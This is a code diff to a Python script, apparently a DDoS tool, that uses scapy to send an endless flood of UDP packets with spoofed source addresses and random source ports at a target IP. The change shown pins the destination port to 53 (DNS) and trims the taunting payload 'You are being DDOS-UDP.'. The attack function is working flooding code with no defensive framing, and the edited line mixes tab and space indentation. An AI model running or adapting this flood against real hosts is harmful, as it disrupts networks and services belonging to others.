@@ -1,3 +1,4 @@
+from __future__ import print_function
 import socket
 from scapy.all import *
 from rport import *
@@ -17,12 +18,13 @@ def udp_attack(ip):
 #udp_attack("192.168.0.1")
 
 def spoof_udp_attack(ip):
-	message = b'You are being DDOS-UDP.' * 10
+	message = b'You are being DDOS-UDP.'
 
 	while 1:
 		src = spoof_ipv4()
 		sport = randomize_port()
-		dport = randomize_port()
+		#dport = randomize_port()
+        dport = 53
 		packet = IP(src=src,dst=ip)/UDP(sport=sport,dport=dport)/message
 		send(packet)
 		print(src + "attacks from port " + str(sport) +" to " + str(dport))
